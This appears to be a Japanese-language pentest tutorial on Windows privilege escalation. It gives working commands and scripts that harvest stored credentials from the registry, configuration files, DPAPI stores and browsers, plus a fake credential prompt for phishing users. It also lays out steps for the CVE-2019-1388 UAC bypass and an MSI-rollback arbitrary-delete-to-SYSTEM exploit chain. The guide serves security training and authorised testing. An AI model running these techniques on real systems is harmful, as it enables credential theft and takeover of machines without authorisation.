### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
適切な `/masterkey` を指定して **Mimikatz** の `dpapi::rdg` module を使用し、**任意の .rdg files を復号**する\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから **多数の DPAPI masterkeys を抽出**できる

### Sticky Notes

Windows workstations では、データベース file であることを知らずに、**passwords** やその他の情報を保存するために Sticky Notes app を使用することがよくあります。この file は `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**AppCmd.exe から passwords を復元するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
この file が存在する場合、**credentials** が設定されており、**復元**できる可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM privileges で実行される**ため、多くの場合 **DLL Sideloading に対して脆弱**です（情報元: **[**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ（認証情報）

### Puttyの認証情報
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内のSSH keys

SSH private keysはレジストリキー`HKCU\Software\OpenSSH\Agent\Keys`内に保存されている可能性があるため、そこに何か興味深いものがないか確認してください：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用して簡単に復号できます。\
この technique の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service が実行されておらず、boot 時に自動的に起動したい場合は、次を実行します。
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この technique はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加してから、ssh 経由でマシンにログインしようとしました。しかし、レジストリの HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` が使用されたことは確認できませんでした。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit** を使用して、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

内容例:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM バックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences (GPP) を介して、複数のマシンにカスタムの local administrator アカウントを展開できる機能が提供されていました。しかし、この方法には重大な security flaw がありました。第一に、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPOs) には、すべての domain user がアクセスできました。第二に、公開されているデフォルトキーを使用して AES256 で暗号化された、これらの GPP 内の password は、認証済みのすべての user が復号できました。これにより、user が elevated privileges を取得できる可能性があり、深刻な risk が生じていました。

この risk を軽減するため、空ではない `cpassword` field を含む、locally cached GPP files を検索する function が開発されました。そのような file が見つかると、function は password を復号し、カスタムの PowerShell object を返します。この object には GPP と file の location に関する詳細が含まれており、この security vulnerability の特定と remediation に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、以下の files を検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexecを使用してパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
認証情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っている可能性があると思うなら、いつでも**ユーザーに自身の認証情報、または別のユーザーの認証情報を入力するよう求める**ことができます（クライアントに直接**認証情報**を**尋ねる**のは非常に**リスクが高い**ことに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**を**平文**または**Base64**で含んでいたことが知られているファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索する：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の認証情報

認証情報を探すために、ごみ箱も確認してください。

複数のプログラムで保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性があるその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome または Firefox** に保存された passwords の dbs を確認する必要があります。\
また、ブラウザの history、bookmarks、favourites も確認してください。そこに **passwords が** 保存されている可能性があります。

ブラウザから passwords を抽出する Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた technology で、異なる language の software components 間の **intercommunication** を可能にします。各 COM component は **class ID (CLSID)** によって **identified** され、各 component は 1 つ以上の interfaces を介して functionality を公開します。interfaces は interface IDs (IIDs) によって identified されます。

COM classes と interfaces は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** 配下で定義されています。この registry は、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** を merge して作成されます。

この registry の CLSIDs 内には、child registry **InProcServer32** があります。ここには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) となる **ThreadingModel** という value が含まれています。

![Browsers History - COM DLL Overwriting: この registry の CLSIDs 内には child registry InProcServer32 があります。ここには DLL を指す default value と、value...](<../../images/image (729).png>)

基本的に、実行される予定の **DLL のいずれかを overwrite** でき、その DLL が別の user によって実行される場合、**privileges を escalate** できます。

attacker が persistence mechanism として COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索する Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は私が作成した msf** plugin で、victim 内の credentials を検索するすべての metasploit POST module を**自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで説明されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system から password を抽出するもう1つの優れた tool です。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tool は、データを clear text で保存する複数の tool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## リークしたハンドル

**SYSTEM として実行されているプロセスが、完全なアクセス権で新しいプロセスを開く**（`OpenProcess()`）状況を想像してください。さらに同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセスを作成**（`CreateProcess()`）したとします。\
その場合、**低い権限のプロセスに対する完全なアクセス権**があれば、`OpenProcess()` で作成された特権プロセスへの**オープンハンドルを取得**し、**shellcode を注入**できます。\
[**この脆弱性を検出して悪用する方法**の詳細については、この例を参照してください。](leaked-handle-exploitation.md)\
[**異なる権限レベル（完全なアクセス権だけではありません）で継承された、プロセスおよびスレッドのより多くのオープンハンドルをテストして悪用する方法**については、こちらの**別の投稿**を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** と呼ばれる機能があり、異なるネットワーク上にある場合でも、無関係なプロセス間でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、**named pipe server** と **named pipe client** という役割に分かれます。

**client** がパイプ経由でデータを送信すると、パイプを設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の身元を偽装**できます。模倣可能なパイプを介して通信する**特権プロセス**を特定できれば、確立したパイプとそのプロセスが通信した際に、そのプロセスの身元を採用して**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md) と [**こちら**](#from-high-integrity-to-system) に役立つガイドがあります。

また、以下のツールを使用すると、**burp のようなツールで named pipe の通信をインターセプト**できます。[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **さらに、以下のツールを使用すると、すべてのパイプを一覧表示して確認し、privescs を見つけることができます。** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は、server モードで `\\pipe\\tapsrv`（MS-TRP）を公開します。リモートの認証済み client は、mailslot ベースの非同期イベントパスを悪用して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して、任意の DLL を service としてロードできます。完全な流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` → service は `CreateFileW(..., OPEN_EXISTING)` を介してそのパスを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` から攻撃者が制御する `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）をトリガーし、`GetAsyncEvents`（`Req_Func 0`）で取得した後、unregister/shutdown して決定論的な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行可能な File Extensions

**[https://filesec.io/](https://filesec.io/)** のページを確認してください。

### Markdown renderer を介した Protocol handler / ShellExecute abuse

`ShellExecuteExW` に転送されたクリック可能な Markdown リンクは、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）をトリガーし、攻撃者が制御するファイルを現在の user として実行できます。以下を参照してください。

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードの Command Line を監視する**

user として shell を取得した場合、**command line で credential を渡す** scheduled task やその他のプロセスが実行されている可能性があります。以下の script は、2 秒ごとにプロセスの command line を取得し、現在の状態と前回の状態を比較して、差分があれば出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを窃取する

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや、"NT\AUTHORITY SYSTEM" などの他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC Bypass を同時に実行できます。さらに、何もインストールする必要がなく、処理中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部は次のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、以下の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level へ / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypasses について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている technique で、exploit code は[**こちらで入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この attack は基本的に、Windows Installer の rollback 機能を悪用し、uninstallation process 中に正規のファイルを malicious なファイルに置き換えるものです。このため attacker は、**malicious MSI installer**を作成する必要があります。これは `C:\Config.Msi` folder を hijack するために使用され、その後、他の MSI packages の uninstallation 中に Windows Installer が rollback files を保存するために使われます。その rollback files には malicious payload が含まれるよう変更されます。

要約した technique は次のとおりです:

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空にする）**

- Step 1: MSI を install
- writable folder（`TARGETDIR`）に harmless なファイル（例: `dummy.txt`）を install する `.msi` を作成します。
- installer を **"UAC Compliant"** として mark し、**non-admin user** が実行できるようにします。
- install 後もファイルへの **handle** を open のままにします。

- Step 2: Uninstall を開始
- 同じ `.msi` を uninstall します。
- uninstall process はファイルを `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）に rename し始めます。
- `GetFinalPathNameByHandle` を使用して **open file handle を poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います:
- `.rbf` が written されたことを signal します。
- その後、uninstall を続行する前に別の event を wait します。

- Step 4: `.rbf` の deletion を block
- signal を受けたら、`FILE_SHARE_DELETE` なしで **`.rbf` file を open** します。これにより **deletion を防止**します。
- 次に signal を返し、uninstall を完了できるようにします。
- Windows Installer は `.rbf` の deletion に失敗し、すべての contents を delete できないため、**`C:\Config.Msi` は remove されません**。

- Step 5: `.rbf` を手動で delete
- あなた（attacker）が `.rbf` file を手動で delete します。
- これで **`C:\Config.Msi` は空**になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を trigger**して `C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: Weak ACLs で `C:\Config.Msi` を再作成
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を使用して **handle を open のまま**にします。

- Step 7: 別の Install を実行
- 次の設定で `.msi` を install します:
- `TARGETDIR`: Writable location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を読み取る **rollback** を再度 trigger するために使用されます。

- Step 8: `.rbs` を monitor
- `ReadDirectoryChangesW` を使用して `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を capture します。

- Step 9: Rollback 前に Sync
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います:
- `.rbs` が created されたときに event を signal します。
- その後、続行する前に wait します。

- Step 10: Weak ACL を再適用
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs を再適用**します。
- しかし、`WRITE_DAC` を使用した handle をまだ保持しているため、**weak ACLs を再度適用**できます。

> ACLs は **handle open 時にのみ enforce される**ため、folder への write は引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を drop
- `.rbs` file を **fake rollback script** で overwrite します。この script は Windows に次の処理を指示します:
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore します。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を drop します。

- Step 12: Rollback を trigger
- sync event を signal し、installer を resume させます。
- **type 19 custom action (`ErrorOut`)** は、既知の point で install を **intentionally fail** させるよう configure されています。
- これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL を install
- Windows Installer は次の処理を行います:
- malicious な `.rbs` を read します。
- `.rbf` DLL を target location に copy します。
- これで **SYSTEM-loaded path に malicious DLL** が存在する状態になります。

- Final Step: SYSTEM Code を execute
- hijack した DLL を load する trusted な **auto-elevated binary**（例: `osk.exe`）を run します。
- **Boom**: code が **SYSTEM として execute**されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

main MSI rollback technique（前述のもの）は、**entire folder**（例: `C:\Config.Msi`）を delete できることを前提としています。しかし、vulnerability が **arbitrary file deletion** のみを許可している場合はどうでしょうか？

**NTFS internals**を exploit できます。すべての folder には、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream には、フォルダーの **インデックスメタデータ** が保存されます。

そのため、フォルダーの **`::$INDEX_ALLOCATION` stream** を**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete APIを呼び出しているにもかかわらず、**folder自体が削除されます**。

### Folder Contents DeleteからSYSTEM EoPへ
primitiveが任意のファイルやfolderを削除できない一方で、攻撃者が制御するfolderの**contentsを削除できる**場合はどうでしょうか？

1. Step 1: bait folderとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`に**oplock**を設定する
- 特権プロセスが`file1.txt`を削除しようとすると、oplockによって**実行が一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM processをトリガーする（例: `SilentCleanup`）
- このprocessはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt`に到達すると、**oplock triggers**が発生し、controlがcallbackに渡されます。

4. Step 4: oplock callback内で削除先をリダイレクトする

- Option A: `file1.txt`を別の場所へ移動する
- これにより、oplockを壊さずに`folder1`を空にできます。
- `file1.txt`を直接削除しないでください。削除すると、oplockが早期に解放されます。

- Option B: `folder1`を**junction**に変換する：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
